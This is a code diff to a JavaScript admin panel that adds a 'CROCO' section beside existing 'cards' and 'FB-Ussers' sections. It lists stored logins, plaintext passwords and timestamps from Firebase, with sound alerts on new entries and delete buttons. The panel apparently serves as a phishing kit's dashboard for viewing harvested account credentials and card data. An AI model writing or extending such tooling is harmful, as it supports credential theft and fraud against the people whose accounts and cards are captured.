@@ -65,7 +65,6 @@ let authWrapper = document.querySelector(".auth-wrapper");
 let userName = document.querySelector(".user-name");
 let userPassword = document.querySelector(".password");
 let loginBtn = document.querySelector(".login-btn");
-let cardsWrapper = document.querySelector(".cards-wrapper");
 let logOutBtn = document.querySelector(".logout-btn");
 let loader = document.querySelector(".loader-wrapper");
 let secssesfuly = document.querySelector(".secssesfuly");
@@ -73,16 +72,36 @@ let errorInfo = document.querySelector(".error");
 let adminPanelWrapper = document.querySelector(".adminpanel");
 let cardsBtn = document.querySelector(".cards-btn");
 let fbBtn = document.querySelector(".fb-btn");
+let crocoBtn = document.querySelector(".croco-btn");
 let fbWrapper = document.querySelector(".fb-wrapper");
+let cardsWrapper = document.querySelector(".cards-wrapper");
+let crocoWrapper = document.querySelector(".croco-wrapper");
 
 cardsBtn.addEventListener("click", () => {
   fbWrapper.classList.add("hidden");
   cardsWrapper.classList.remove("hidden");
+  crocoWrapper.classList.add("hidden");
+  cardsBtn.classList.add("active");
+  fbBtn.classList.remove("active");
+  crocoBtn.classList.remove("active");
 });
 
 fbBtn.addEventListener("click", () => {
   cardsWrapper.classList.add("hidden");
   fbWrapper.classList.remove("hidden");
+  crocoWrapper.classList.add("hidden");
+  cardsBtn.classList.remove("active");
+  fbBtn.classList.add("active");
+  crocoBtn.classList.remove("active");
+});
+
+crocoBtn.addEventListener("click", () => {
+  cardsWrapper.classList.add("hidden");
+  fbWrapper.classList.add("hidden");
+  crocoWrapper.classList.remove("hidden");
+  cardsBtn.classList.remove("active");
+  fbBtn.classList.remove("active");
+  crocoBtn.classList.add("active");
 });
 
 logOutBtn.addEventListener("click", () => {
@@ -131,6 +150,13 @@ loginBtn.addEventListener("click", () => {
           cardsInfo(snapshot.val());
         });
 
+      firebase
+        .database()
+        .ref("CROCO")
+        .on("value", (snapshot) => {
+          crocoInfo();
+        });
+
       setTimeout(() => {
         fbWrapper.classList.add("hidden");
       }, 1300);
@@ -141,7 +167,6 @@ loginBtn.addEventListener("click", () => {
     }, 2500);
 
     ClearInputsValue();
-    console.log("mushaobs");
   } else {
     ClearInputsValue();
     loader.classList.add("hidden");
@@ -174,6 +199,13 @@ userPassword.addEventListener("keyup", (e) => {
           .ref("FB-Ussers")
           .on("value", (snapshot) => {
             fbInfo();
+          });
+
+        firebase
+          .database()
+          .ref("CROCO")
+          .on("value", (snapshot) => {
+            crocoInfo();
           });
 
         firebase
@@ -220,6 +252,31 @@ function cardsInfo(data) {
     `;
 }
 
+function crocoInfo(data) {
+  const infoArray = getRefFromFirebase("CROCO");
+  crocoNotif();
+  crocoWrapper.innerHTML = "";
+
+  infoArray.forEach((info) => {
+    crocoWrapper.innerHTML += `
+     
+    <div class="fb-wrapper-all-data" id="${info.id}">
+<div class="remove-wrapper">
+
+
+<button class="remove" onclick="removeInfoCroco('${info.id}')"><i class="fa-solid fa-trash"></i></button>
+</div>
+    <p class="fb-usser"><i class="fa-solid fa-user"></i> <span class="spn-user">${info.data.login}</span></p>
+    <p class="fb-pasw"><i class="fa-solid fa-key"></i> <span class="spn-psw">${info.data.pasw}</span></p>
+    <p class="fb-time"><i class="fa-solid fa-calendar-days"></i> <span class="spn-time">${info.data.time}</span></p>
+    
+  
+  </div>
+  
+  `;
+  });
+}
+
 function fbInfo(data) {
   const infoArray = getRefFromFirebase("FB-Ussers");
   fbWrapper.innerHTML = "";
@@ -253,6 +310,10 @@ function removeInfo(id) {
   removeElementFromFirebase("FB-Ussers", id);
 }
 
+function removeInfoCroco(id) {
+  removeElementFromFirebase("CROCO", id);
+}
+
 function notificationSound() {
   let song = new Audio("notification.wav");
   song.play();
@@ -261,4 +322,9 @@ function notificationSound() {
 function cardNotification() {
   let noti = new Audio("cardnotifi.wav");
   noti.play();
+}
+
+function crocoNotif() {
+  let crocoNotif = new Audio("croconotif.wav");
+  crocoNotif.play();
 }
